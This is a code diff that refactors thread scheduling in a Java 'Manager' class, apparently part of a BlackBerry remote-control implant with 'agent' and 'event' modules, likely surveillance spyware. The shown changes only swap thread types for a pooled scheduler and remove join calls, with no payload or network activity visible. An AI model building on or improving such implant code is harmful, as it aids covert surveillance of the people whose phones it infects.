@@ -12,10 +12,12 @@ import java.util.Vector;
 
 import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.event.Event;
+import com.ht.rcs.blackberry.threadpool.ThreadPool;
+import com.ht.rcs.blackberry.threadpool.Scheduler;
+import com.ht.rcs.blackberry.threadpool.TimerJob;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
 import com.ht.rcs.blackberry.utils.DebugLevel;
-import com.ht.rcs.blackberry.utils.StartStopThread;
 import com.ht.rcs.blackberry.utils.Utils;
 
 /**
@@ -40,12 +42,12 @@ public abstract class Manager {
     }
 
     public final boolean isEnabled(int id) {
-        StartStopThread thread = getItem(id);
+        TimerJob thread = getItem(id);
         return thread.isEnabled();
     }
 
     public final void enable(int id) {
-        StartStopThread thread = getItem(id);
+        TimerJob thread = getItem(id);
         thread.enable(true);
     }
 
@@ -53,9 +55,11 @@ public abstract class Manager {
         return getItem(id).isRunning();
     }
 
-    public abstract StartStopThread getItem(int id);
+    public abstract TimerJob getItem(int id);
 
     public abstract Vector getAllItems();
+    
+    private Scheduler threadPool = new Scheduler(4);
 
     /**
      * Re start.
@@ -69,7 +73,7 @@ public abstract class Manager {
         debug.trace("restart " + id);
         boolean ret = true;
 
-        StartStopThread thread = getItem(id);
+        TimerJob thread = getItem(id);
         if (thread == null) {
             // #debug
             debug.error("Thread unknown: " + id);
@@ -96,26 +100,30 @@ public abstract class Manager {
      */
     public final synchronized boolean start(int id) {
 
-        StartStopThread thread = getItem(id);
-        if (thread == null) {
+        TimerJob stThread = getItem(id);
+        if (stThread == null) {
             // #debug
             debug.error("Thread unknown: " + id);
             return false;
         }
 
-        if (!thread.isEnabled()) {
+        if (!stThread.isEnabled()) {
             // #debug
             debug.error("Not enabled [0] " + id);
             return false;
         }
 
-        if (thread.isRunning()) {
+        if (stThread.isRunning()) {
             // #debug
             debug.info("Start RUNNING" + id);
             return true;
         }
 
-        thread.start();
+        //Thread thread = new Thread(stThread);
+        //thread.start();
+        
+        threadPool.add(stThread);
+        
         // #debug
         debug.trace("Start() OK");
         return true;
@@ -133,7 +141,7 @@ public abstract class Manager {
 
         //#mdebug
         for (int i = 0; i < tsize; ++i) {
-            StartStopThread thread = (StartStopThread) threads.elementAt(i);
+            TimerJob thread = (TimerJob) threads.elementAt(i);
             debug.trace("Thread to start: " + thread);
             thread = null;
         }
@@ -141,23 +149,28 @@ public abstract class Manager {
 
         try {
             for (int i = 0; i < tsize; ++i) {
-                StartStopThread thread = (StartStopThread) threads.elementAt(i);
+                TimerJob stThread = (TimerJob) threads.elementAt(i);
 
-                if (thread.isEnabled()) {
+                if (stThread.isEnabled()) {
                     // #debug
-                    debug.trace("Starting: " + thread);
-                    thread.start();
+                    debug.trace("Starting: " + stThread);
+                    /*Thread thread = new Thread(stThread);
+                    thread.start();*/
+                    threadPool.add(stThread);
+                                        
                 } else {
                     // #debug
-                    debug.trace("Not starting because disabled: " + thread);
+                    debug.trace("Not starting because disabled: " + stThread);
                 }
                 
-                Utils.sleep(1000);
+                Utils.sleep(100);
             }
         } catch (Exception ex) {
             debug.error(ex.toString());
         }
-
+        
+        threadPool.start();
+        
         // #debug
         debug.trace("StartAll() OK");
         return true;
@@ -171,19 +184,12 @@ public abstract class Manager {
      * @return the int
      */
     public final synchronized boolean stop(int id) {
-        StartStopThread thread = getItem(id);
+        TimerJob thread = getItem(id);
 
         if (thread.isRunning()) {
             if (thread != null) {
                 thread.stop();
-            }
-
-            try {
-                thread.join();
-            } catch (InterruptedException e) {
-                // #debug
-                debug.error("Interrupted");
-            }
+            }      
         }
 
         return true;
@@ -199,16 +205,10 @@ public abstract class Manager {
 
         int tsize = threads.size();
         for (int i = 0; i < tsize; ++i) {
-            StartStopThread thread = (StartStopThread) threads.elementAt(i);
+            TimerJob thread = (TimerJob) threads.elementAt(i);
 
             if (thread.isRunning()) {
-                thread.stop();
-                try {
-                    thread.join();
-                } catch (InterruptedException e) {
-                    // #debug
-                    debug.error("Interrupted");
-                }
+                thread.stop();               
             }
         }
 
